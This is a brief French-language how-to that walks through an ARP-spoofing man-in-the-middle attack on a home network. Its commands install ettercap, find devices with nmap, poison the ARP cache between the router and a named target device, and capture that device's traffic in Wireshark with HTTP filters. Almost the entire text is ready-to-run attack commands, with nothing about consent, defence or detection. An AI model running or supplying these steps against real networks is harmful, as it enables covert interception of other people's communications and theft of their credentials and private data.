## 1. Installation de ettercap cli

```bash
apt install ettercap-text-only
```

## 2. Scanner le réseau privé pour y voir tous les appareils connectés

```bash
# remplacer 192.168.1.1 par l'IP du routeur (box internet)
nmap -sn 192.168.1.1/24
```

## 3. Démarrer l'attaque MITM avec ettercap

```bash
# la première IP est celle du routeur
# la seconde, celle de l'appareil à attaquer
ettercap -T -S -i wlan0 -M arp:remote /192.168.1.1// /192.168.1.10//
```

## 4. Voir le traffic intercepté

```bash
wireshark
```

## 5. Filtrer le traffic reçu dans wireshark (depuis l'application wireshark)

```bash
# ne voir que les requêtes de l'IP spécifiée (ici la cible de l'attaque)
ip.addr == 192.168.1.10

# ne voir que les requêtes utilisant le protocol HTTP
http
```
